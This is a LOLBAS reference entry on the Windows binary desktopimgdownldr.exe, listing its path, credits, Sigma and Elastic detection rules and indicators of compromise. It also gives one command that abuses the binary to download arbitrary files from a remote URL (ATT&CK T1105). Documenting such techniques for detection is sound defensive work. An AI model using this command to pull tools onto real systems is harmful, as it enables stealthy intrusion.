---
title: "Desktopimgdownldr.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Desktopimgdownldr/
fetched_at: 2026-09-20T17:09:51Z
license: unspecified
category: windows
---

Windows binary used to configure lockscreen/desktop image

## Paths
- c:\windows\system32\desktopimgdownldr.exe

## Resources
- [https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/](https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/)

## Acknowledgements
- Gal Kristal ([@gal_kristal](https://twitter.com/@gal_kristal))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_susp_execution.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_susp_execution.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/file/file_event/file_event_win_susp_desktopimgdownldr_file.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/file/file_event/file_event_win_susp_desktopimgdownldr_file.yml)
- Elastic: [https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/command_and_control_remote_file_copy_desktopimgdownldr.toml](https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/command_and_control_remote_file_copy_desktopimgdownldr.toml)
- IOC: desktopimgdownldr.exe that creates non-image file
- IOC: Change of HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP\LockScreenImageUrl

## Download

1. Downloads the file and sets it as the computer’s lockscreen

```
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr
```

   - Use case: Download arbitrary files from a web server

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1105
